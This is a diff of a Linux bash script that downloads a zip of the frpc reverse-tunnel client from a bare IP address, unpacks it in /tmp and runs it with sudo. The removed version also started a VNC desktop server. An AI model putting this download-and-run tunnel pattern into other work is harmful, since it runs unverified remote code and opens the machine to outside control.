@@ -1,27 +1,10 @@
 #!/bin/bash
-found_process=$(ps aux | grep -E "frp" | grep -v "grep")
-if [ -n "$found_process" ]; then
-    echo "找到以 frp 开头的进程，正在停止..."
-    sudo killall frp*
-else
-    echo "没有以 frp 开头的进程在运行。"
+sudo killall frpc
+if [ ! -d /tmp/32frplf ] || [ ! -f /tmp/32frplf/frpc ] || [ ! -f /tmp/32frplf/frpc.ini ]; then
+    [ -f /tmp/32frplf.zip ] && rm /tmp/32frplf.zip
+    [ -d /tmp/32frplf ] && rm -rf /tmp/32frplf
+    wget -P /tmp 120.76.41.136:9000/api/public/dl/jkiqyaHp/32frplf.zip
+    unzip /tmp/32frplf.zip -d /tmp
+    chmod +x /tmp/32frplf/frpc
 fi
-if ps aux | grep -v grep | grep "vino-server" >/dev/null; then
-    echo "vino-server 正在运行。"
-else
-    echo "vino-server 未运行，正在启动..."
-    nohup /usr/lib/vino/vino-server &
-fi
-if [ ! -d /tmp/32frp ] || [ ! -f /tmp/32frp/frpc ] || [ ! -f /tmp/32frp/frpc.ini ]; then
-    [ -f /tmp/32frp.zip ] && rm /tmp/32frp.zip
-    [ -d /tmp/32frp ] && rm -rf /tmp/32frp
-    wget -P /tmp 120.76.41.136:9000/api/public/dl/NqTIzav9/32frp.zip
-    unzip /tmp/32frp.zip -d /tmp
-    chmod +x /tmp/32frp/frpc
-fi
-if ! command -v timeout &> /dev/null; then
-    echo "timeout 命令不存在，将从 /tmp/32frp/ 复制到 /usr/local/bin/"
-    sudo cp /tmp/32frp/timeout /usr/local/bin/timeout
-    sudo chmod +x /usr/local/bin/timeout
-fi
-timeout 20s /tmp/32frp/frpc -c /tmp/32frp/frpc.ini &
+timeout 1h /tmp/32frplf/frpc -c /tmp/32frplf/frpc.ini &
